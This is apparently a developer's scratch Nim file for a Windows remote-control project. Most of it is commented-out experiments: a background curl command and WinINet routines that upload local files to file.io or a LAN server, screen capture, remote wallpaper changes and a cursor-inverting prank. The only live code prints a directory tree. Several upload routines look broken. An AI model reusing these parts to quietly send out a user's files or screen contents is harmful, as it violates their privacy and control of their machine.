import os, encodings,   winim/inc/wininet, json, winim, strutils, osproc, configparser, random, bitops, asyncdispatch

# proc uploadFile(filePath: string): string =
#   let url = "https://file.io"
#   let session = WinHttpOpen("Nim File Upload", WINHTTP_ACCESS_TYPE_NO_PROXY, nil, nil, 0)
#   let connection = WinHttpOpenRequest(session, "POST", "/", nil, nil, nil, WINHTTP_FLAG_SECURE)

#   # Set content type
#   let headers = "Content-Type: multipart/form-data; boundary=---------------------------14737809831466499882746641449"

#   # Create the multipart form data body
#   var formData = "-----------------------------14737809831466499882746641449\r\n"
#   var (_, name, ext) = splitFile(filePath)
#   formData &= "Content-Disposition: form-data; name=\"file\"; filename=\"" & name & ext & "\"\r\n"
#   formData &= "Content-Type: application/octet-stream\r\n\r\n"
#   let body = formData & readFile(filePath) & "\r\n-----------------------------14737809831466499882746641449--\r\n"

#   echo "BODY:\n", body

#   var err_code = WinHttpSendRequest(connection, headers, headers.len,addr body[0], body.len, body.len, 0)
#   echo "SendRequestErrcode: ", err_code
  
#   err_code = WinHttpReceiveResponse(connection, nil)
#   echo "ReceiveResponse: ", err_code

#   var bytesRead:DWORD = 0
#   var content: seq[byte]
#   while true:
#     var buffer = newSeq[byte](4096)
#     if not WinHttpReadData(connection, buffer.addr, buffer.len, addr bytesRead):
#       break
#     if bytesRead == 0:
#       break
#     content.add(buffer[0..<bytesRead])

#   WinHttpCloseHandle(connection)
#   WinHttpCloseHandle(session)

#   #let responseContent = content.newString(content.len).decode("utf-8")
#   var content_str:string

#   for i in 0..<len(content):
#     content_str &= char(content[i])

#   echo "RAW: ", $content
#   echo "CONTENT: [", content_str, "]"

#   let responseContent = content_str

#   if responseContent.contains("success\":true"):
#     let jsonResponse = parseJson(responseContent)
#     return jsonResponse["link"].str
#   else:
#     return "Upload failed"



# # Example usage
# # when isMainModule:
# #   #let uploadedLink = uploadFile("test.txt")
# #   var (output, exitcode) = execCmdEx("curl -F \"file=:@G:\\Script\\GitHub\\irc-mcgee\\test.txt\" https://file.io")
# #   echo "Uploaded file link: ", output


# # const vnum = readFile("./update/update.ini").parseIni().getProperty("Version","Version")
# # echo vnum

# # var (output, _ ) = execCmdEx("cmd.exe /C start /B curl -sF  \"file=@./update/update.ini\" \"https://file.io?expires=1h\"")
# # echo output



# proc srcn_captureScreen(x,y,width,height:int, pixelData: var seq[byte]):bool =
#   var
#     hdcScreen:HDC = GetDC(0)
#     hdcMem:HDC = CreateCompatibleDC(hdcScreen)
#     hBitmap:HBITMAP  = CreateCompatibleBitmap(hdcScreen, width, height)
#   discard SelectObject(hdcMem, hBitmap)
#   BitBlt(hdcMem, 0, 0, width, height, hdcScreen, x, y, SRCCOPY)

#   var
#     bi:BITMAPINFOHEADER 
#   bi.biSize = sizeof(BITMAPINFOHEADER)
#   bi.biWidth = width
#   bi.biHeight = height
#   bi.biPlanes = 1
#   bi.biBitCount = 24
#   bi.biCompression = BI_RGB
#   bi.biSizeImage = 0
#   bi.biXPelsPerMeter = 0
#   bi.biYPelsPerMeter = 0
#   bi.biClrUsed = 0
#   bi.biClrImportant = 0
  
#   GetDIBits(hdcMem, hBitmap, 0, height, addr pixelData[0], cast[LPBITMAPINFO](addr bi), DIB_RGB_COLORS)
#   DeleteDC(hdcMem)
#   ReleaseDC(0, hdcScreen)
#   DeleteObject(hBitmap)

#   return true

# proc srcn_saveBitmap(filename:string, width,height:uint32, pixelData: seq[byte]) =
#   var
#     file:File
#   if file.open(filename,fmWrite):
#     var
#       headerSize:uint32 = 14
#       infoHeaderSize:uint32 = 40
#       imageSize:uint32 = width * height
#       fileSize:uint32 = headerSize + infoHeaderSize + imageSize

#       header:seq[uint8] = @[
#         'B'.uint8, 'M'.uint8,
#         0,0,0,0, #filzeSize 4 bytes: i = 2
#         0,0,0,0,
#         (headerSize+infoHeaderSize).uint8,
#         0,0,0
#       ]

#       headerPtr:ptr array[4, uint32]
    
#       infoHeader:seq[uint8] = @[
#         0,0,0,0, # infoHeaderSize 4 bytes : i = 0
#         0,0,0,0,  #width  4 bytes : i = 4
#         0,0,0,0, #height 4 bytes : i = 8
#         1,0,
#         24,0,
#         0,0,0,0,
#         imageSize.uint8,0,0,0,
#         0,0,0,0,
#         0,0,0,0,
#         0,0,0,0,
#         0,0,0,0
#       ]
#       infoHeaderPtr:ptr array[10, uint32]

#     headerPtr = cast[ptr array[4,uint32]](addr header[2])
#     headerPtr[][0] = fileSize

#     infoHeaderPtr = cast[ptr array[10,uint32]](addr infoHeader[0])
#     infoHeaderPtr[][0] = infoHeaderSize
#     infoHeaderPtr[][1] = width
#     infoHeaderPtr[][2] = height

#     echo "headerBytes: [", file.writeBytes(header,0,len(header)), "] size: [",len(header),"]"
#     echo "infoHeaderBytes: [", file.writeBytes(infoHeader,0,len(infoHeader)),"] size: [",len(infoHeader),"]"
#     echo "pixelData: [", file.writeBytes(pixelData, 0, len(pixelData))," ] size: [",len(pixelData),"]"
    
#   else:
#     echo "error: opening file failed"
#     return 






# proc set_wallpaper(url:string) =
#   randomize()
#   var
#     randint = rand(1000000..9999999)
#     imagedata = updt_fetchWebsiteContent(url)
#     filename = $randint
#     fullpath:cstring = (getTempDir() & $randint & "\\" & filename).cstring
#     current_dir = getCurrentDir()
#   if not dirExists(getTempDir() & $randint):
#     createDir(getTempDir() & $randint)
#   setCurrentDir(getTempDir() & $randint)
#   writeFile(filename, imagedata)
#   discard SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, fullpath, bitor(SPIF_UPDATEINIFILE,SPIF_SENDCHANGE))
#   setCurrentDir(current_dir)
#   removeFile(getTempDir() & $randint & "\\" & filename)

# var g_mousespack = false

# proc mousespack_func() {.async.} = 
#   var
#     new_p:POINT
#     old_p:POINT
#     first_loop = true
#   new_p.x = 0
#   new_p.y = 0
#   old_p.x = 0
#   old_p.y = 0
#   while g_mousespack:
#     try:
#       GetCursorPos(addr new_p)
#       if first_loop:
#         old_p = new_p
#         first_loop = false
#       var
#         delta_x = old_p.x - new_p.x
#         delta_y = old_p.y - new_p.y
#         result_x:int = (2*delta_x) + new_p.x
#         result_y:int = (2*delta_y) + new_p.y
#       discard SetCursorPos(result_x, result_y)
#       GetCursorPos(addr old_p)
#       await sleepAsync(5)
#     except:
#       discard
    


# proc mousespack() {.async.} =
#   if g_mousespack:
#     g_mousespack = false
#   else:
#     g_mousespack = true
#     await mousespack_func()






# proc uploadFile(url: string, filePath: string): string =
#   # Initialize WinINet
#   var hInternet: wininet.HINTERNET = InternetOpenA("MyUploader", INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)

#   if hInternet.isNil:
#     return "Failed to initialize WinINet"

#   # Open the file for reading
#   var hFile: HFILE = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, HANDLE(0))

#   if hFile == 0:
#     InternetCloseHandle(hInternet)
#     return "Failed to open the file"

#   # Prepare to upload
#   var urlComponents: wininet.URL_COMPONENTSA
#   urlComponents.dwStructSize = sizeof(wininet.URL_COMPONENTSA)
#   urlComponents.dwHostNameLength = -1
#   urlComponents.dwUrlPathLength = -1

#   var urlBuf: array[512, char]
#   urlComponents.lpszHostName = addr urlBuf[0]
#   urlComponents.lpszUrlPath = addr urlBuf[256]
#   urlComponents.dwHostNameLength = urlBuf.len - 256

#   if InternetCrackUrlA(url, 0, wininet.ICU_ESCAPE.DWORD, addr urlComponents) == FALSE:
#     InternetCloseHandle(hInternet)
#     CloseHandle(hFile)
#     echo $urlComponents
#     return "Failed to parse URL"

#   var hConnect: wininet.HINTERNET = InternetOpenUrlA(hInternet, url, nil, 0, INTERNET_FLAG_RELOAD, 0)

#   if hConnect.isNil:
#     InternetCloseHandle(hInternet)
#     CloseHandle(hFile)
#     return "Failed to open URL"

#   # Send the HTTP request
#   var
#     bytesRead: DWORD = 0
#     buffer: array[1024, byte]

#   while (ReadFile(hFile, addr buffer[0], buffer.len, addr bytesRead, nil) == TRUE) and (bytesRead > 0):
#     if InternetWriteFile(hConnect, addr buffer[0], bytesRead, nil) == FALSE:
#       InternetCloseHandle(hConnect)
#       InternetCloseHandle(hInternet)
#       CloseHandle(hFile)
#       echo "LastError: ", $GetLastError()
#       echo "bytesRead: ", $bytesRead
#       echo "buffer: ", $buffer
#       return "Failed to upload file"

#   # Close handles
#   CloseHandle(hFile)
#   InternetCloseHandle(hConnect)
#   InternetCloseHandle(hInternet)

#   return "File uploaded successfully"

# # Example usage
# when isMainModule:
#   let url:string = "https://file.io?expires=1h"
#   let filePath = "G:\\Script\\GitHub\\irc-mcgee\\hey.txt"
#   let result = uploadFile(url, filePath)
#   echo(result)





# when isMainModule:
  # waitFor mousespack()

  # echo "hey"
  # var
  #   pixelData:seq[byte]
  # setLen(pixelData,1600*900*24)
  # if srcn_captureScreen(0,0,1600,900,pixelData):
  #   srcn_saveBitmap("testfile.bmp",1600,900,pixelData)
  # else:
  #   echo "A"
  # set_wallpaper("https://i.imgflip.com/214nik.jpg")




# proc uploadFileToWebsite(filename: string): string =
#   const
#     url = "https://file.io"
#     boundary = "----Boundary"
#     fileField = "file"

#   var
#     hInternet: wininet.HINTERNET
#     hConnect: wininet.HINTERNET
#     formData: string
#     formDataBytes: seq[byte]

#   hInternet = InternetOpenA("NimUploader", INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0)
#   if hInternet.isNil:
#     raise newException(OSError, "InternetOpenA failed")

#   hConnect = InternetOpenUrlA(hInternet, url, nil, 0, INTERNET_FLAG_RELOAD, 0)
#   if hConnect.isNil:
#     raise newException(OSError, "InternetOpenUrlA failed")

#   # Create the form data
#   formData = "Content-Type: multipart/form-data; boundary=" & boundary & "\r\n\r\n"
#   formData.add("--" & boundary & "\r\n")
#   formData.add("Content-Disposition: form-data; name=\"" & fileField & "\"; filename=\"" & filename & "\"\r\n")
#   formData.add("Content-Type: application/octet-stream\r\n\r\n")


#   for ch in formData:
#     formDataBytes.add(cast[byte](ch))

#   # Send the POST request with the file
#   if HttpSendRequestA(hConnect, nil, 0, addr(formDataBytes[0]), formData.len()) == FALSE:
#     echo "GLE: ", GetLastError()
#     raise newException(OSError, "HttpSendRequestA failed")

#   # Read the response
#   var responseText: string = ""
#   var bytesRead: DWORD
#   const bufferSize = 1024
#   var buffer: array[bufferSize, byte]
  
#   echo "spack"
#   while InternetReadFile(hConnect, addr(buffer), bufferSize, addr bytesRead) == TRUE:
#     if bytesRead > 0:
#       for ch in 0..<bytesRead:
#         responseText.add(char(buffer[ch]))
  
#   echo "ENTSPACK"
#   InternetCloseHandle(hConnect)
#   InternetCloseHandle(hInternet)

#   return responseText

# # Example usage:
# try:
#   let response = uploadFileToWebsite("hey.txt")
#   echo(response)
# except OSError as e:
#   echo "ERROR: ", repr(e)

# when isMainModule:
#   var (output, _ ) = execCmdEx("cmd.exe /C ver")
#   output = output.strip(chars={'\r','\n'})
#   echo output




# import winim, winim/inc/wininet, strutils, json, os 

# proc UploadFileToServer(filePath: cstring): cstring =
#     var
#         hInternet: HINTERNET
#         hConnect: HINTERNET
#         response: cstring
#     const
#         url: cstring = "http://192.168.2.45:8075"
#         headers: cstring = "Content-Type: multipart/form-data"
#         boundary: cstring = "--------------------------BOUNDARY1234567890"

#     hInternet = InternetOpen("Nim HTTP Request", INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0)


#     if hInternet.isNil:
#         return "Failed to initialize WinINet."

#     hConnect = InternetOpenUrl(hInternet, url, headers, 0, INTERNET_FLAG_RAW_DATA, 0)


#     response = ""
#     response = $response & "Content-Type: multipart/form-data; boundary=" & $boundary
#     response = $response & "--" & $boundary & "\r\n"
#     response = $response & "Content-Disposition: form-data; name=\"file\"; filename=\"" & $filePath & "\"\r\n"
#     response = $response & "Content-Type: application/octet-stream\r\n\r\n"

#     discard HttpOpenRequest(hConnect, "POST", "/", nil, nil, cast[ptr LPCWSTR](addr(response[0])), 0.DWORD, 0.DWORD_PTR)

#     if hConnect.isNil:
#         InternetCloseHandle(hInternet)
#         return "Failed to open URL."



#     var fileContent: cstring = readFile($filePath).cstring
#     if ($fileContent).strip() == "":
#         InternetCloseHandle(hConnect)
#         InternetCloseHandle(hInternet)
#         return "Failed to read file."


#     response = $response & "\r\n--" & $boundary & "--\r\n"

#     if HttpSendRequest(hConnect, headers, len(headers), response, response.len.DWORD) == FALSE:
#         InternetCloseHandle(hConnect)
#         InternetCloseHandle(hInternet)
#         return "Failed to send request."

#     var jsonResponse: cstring
#     let bufferSize = 1024
#     var responseBuffer = newSeq[char](bufferSize)
#     var totalResponse = ""
#     var loops = 0

#     while InternetReadFile(hConnect, addr(responseBuffer[0]), bufferSize.DWORD, nil) == TRUE:
#         echo "Loop: ", loops
#         loops+=1
#         if responseBuffer.len == 0:
#             break
#         for i in 0..<bufferSize:
#             totalResponse &= $responseBuffer[i]
#         #totalResponse &= responseBuffer[0..bufferSize].cstring

#     InternetCloseHandle(hConnect)
#     InternetCloseHandle(hInternet)

#     return totalResponse.cstring

# proc main() =
#   let filePath: cstring = "hey.txt"  # Replace with your file path
#   let uploadResponse = UploadFileToServer(filePath)

#   echo "Upload Response:"
#   echo $uploadResponse

# when isMainModule:
#   main()


# var
#   folders:seq[string]
#   files:seq[string]
#   cwd = getCurrentDir()
#   spacer_len = 0

# for kind, path in walkDir(cwd):
#   case kind:
#   of pcDir:
#     folders.add(path)
#   of pcFile:
#     files.add(path)
#   else:
#     continue

# proc spacer(amt:int):string =
#   var cnt = amt
#   result = ""
#   while cnt > 0:
#     cnt -= 1
#     result &= " "
#   return result

# var
#   row_cnt = 0
#   row_max = 4

#   folder_str = ""
#   file_str = ""

# for folder in folders:
#   if len("[" & splitPath(folder).tail & "]") > spacer_len:
#     spacer_len = len("[" & splitPath(folder).tail & "]")

# for file in files:
#   if len(splitPath(file).tail) > spacer_len:
#     spacer_len = len(splitPath(file).tail)

# if spacer_len < 30:
#   row_max = 4
# elif spacer_len > 30 and spacer_len < 40:
#   row_max = 3
# elif spacer_len > 40 and spacer_len < 50:
#   row_max = 2
# elif spacer_len > 50:
#   row_max = 1

# for folder in folders:
#   var foldername = "[" & splitPath(folder).tail & "]"
#   folder_str &=  foldername  & spacer(spacer_len-(len(foldername)))
#   row_cnt += 1
#   if row_cnt >= row_max:
#     folder_str &= "\n"
#     row_cnt = 0

# echo "SPACELEN: ", spacer_len

# row_cnt = 0

# for file in files:
#   var filename = splitPath(file).tail
#   file_str &= filename & spacer(spacer_len-len(filename))
#   row_cnt += 1
#   if row_cnt >= row_max:
#     file_str &= "\n"
#     row_cnt = 0
  
# echo "\nPath: [" & cwd & "]\n" & folder_str & "\n" & file_str









proc rexec_tree(path: string, indent: string = "", isLast: bool = true) {.async.} =
  var
    entries: seq[tuple[kind:PathComponent, dirName:string]]
    idx = 0

  for (kind, dirName) in walkDir(path):
    entries.add((kind, dirName))
  

  for entry in entries:
    let isDirectory = if entry.kind == pcDir: true else: false
    let isLastEntry = idx == entries.high
    idx+=1

    echo(indent & (if isLastEntry: "└── " else: "├── ") & splitPath(entry.dirName).tail)
    if isDirectory:
      discard rexec_tree(entry.dirName, indent & (if isLastEntry: "    " else: "│   "), isLastEntry)



proc rexec_tree(path: string, indent: string = "", isLast: bool = true, fulltree: ptr string) {.async, gcsafe.} =
    try:
        var
            entries: seq[tuple[kind:PathComponent, dirName:string]]
            idx = 0
            fulltree_len = len(fulltree[])

        for (kind, dirName) in walkDir(path):
            entries.add((kind, dirName))

        for entry in entries:
            let isDirectory = if entry.kind == pcDir: true else: false
            let isLastEntry = idx == entries.high
            idx+=1

            var append = indent & (if isLastEntry: "└── " else: "├── ") & splitPath(entry.dirName).tail & "\n"
            setLen(fulltree[], len(fulltree[]) + len(append))

            fulltree[] &= append

            if isDirectory:
                await rexec_tree(entry.dirName, indent & (if isLastEntry: "    " else: "│   "), isLastEntry, fulltree)

        if (fulltree_len == 0):
            echo "TREE:\n", fulltree[]
    except OSError as e:
        echo "ERROR:", repr(e)

var
  fulltree:string
  fulltree_ptr:ptr string = addr fulltree
waitFor rexec_tree(getCurrentDir(), "", true, fulltree_ptr)